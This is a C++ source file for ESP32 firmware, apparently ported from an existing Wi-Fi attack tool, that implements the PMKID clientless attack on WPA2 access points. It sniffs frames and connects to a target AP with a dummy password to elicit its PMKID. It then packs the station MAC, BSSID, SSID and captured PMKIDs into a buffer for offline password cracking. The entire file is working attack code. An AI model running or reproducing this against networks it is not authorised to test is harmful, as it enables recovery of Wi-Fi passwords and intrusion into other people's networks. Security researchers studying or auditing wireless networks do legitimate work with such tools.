/**
 * @file attack_pmkid.cpp
 * @brief PMKID clientless attack — converted to C++
 * @author risinek (risinek@gmail.com) | C++ port: Teuku Maulana (TM26)
 *
 * @see https://hashcat.net/forum/thread-7717.html
 */

#include "attack_pmkid.h"

#include <cstring>
#include <cstdlib>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"

static const char *TAG = "attack_pmkid";

static const wifi_ap_record_t *s_ap_record = nullptr;

// ── PMKID capture callback ─────────────────────────────────────────────────

static void pmkid_exit_handler(void * /*args*/,
                                esp_event_base_t /*event_base*/,
                                int32_t /*event_id*/,
                                void *event_data)
{
    ESP_LOGD(TAG, "PMKID captured — finalising attack");
    attack_update_status(FINISHED);
    attack_pmkid_stop();

    auto *head = *static_cast<pmkid_item_t **>(event_data);

    // Count PMKIDs in linked list
    unsigned count = 0;
    for (pmkid_item_t *p = head; p != nullptr; p = p->next) count++;

    // Layout: [MAC_STA(6)] [MAC_AP(6)] [SSID_len(1)] [SSID(n)] [PMKID*count(16 each)]
    const unsigned ssid_len = strlen(reinterpret_cast<const char *>(s_ap_record->ssid));
    char *content = attack_alloc_result_content(6 + 6 + 1 + ssid_len + (count * 16));

    wifictl_get_sta_mac(reinterpret_cast<uint8_t *>(content));
    content += 6;
    memcpy(content, s_ap_record->bssid, 6);
    content += 6;
    content[0] = static_cast<char>(ssid_len);
    content += 1;
    memcpy(content, s_ap_record->ssid, ssid_len);
    content += ssid_len;

    // Drain linked list into contiguous buffer, freeing each node
    pmkid_item_t *cur = head;
    while (cur != nullptr) {
        pmkid_item_t *next = cur->next;
        memcpy(content, cur->pmkid, 16);
        content += 16;
        free(cur);
        cur = next;
    }

    ESP_LOGI(TAG, "PMKID attack finished — %u PMKID(s) captured", count);
}

// ── Public API ─────────────────────────────────────────────────────────────

extern "C" void attack_pmkid_start(attack_config_t *cfg) {
    ESP_LOGI(TAG, "Starting PMKID attack...");
    s_ap_record = cfg->ap_record;

    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(s_ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, s_ap_record->bssid);
    wifictl_sta_connect_to_ap(s_ap_record, "dummypassword");

    ESP_ERROR_CHECK(esp_event_handler_register(
        FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID,
        &pmkid_exit_handler, nullptr));
}

extern "C" void attack_pmkid_stop() {
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(
        ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &pmkid_exit_handler));
    ESP_LOGD(TAG, "PMKID attack stopped");
}
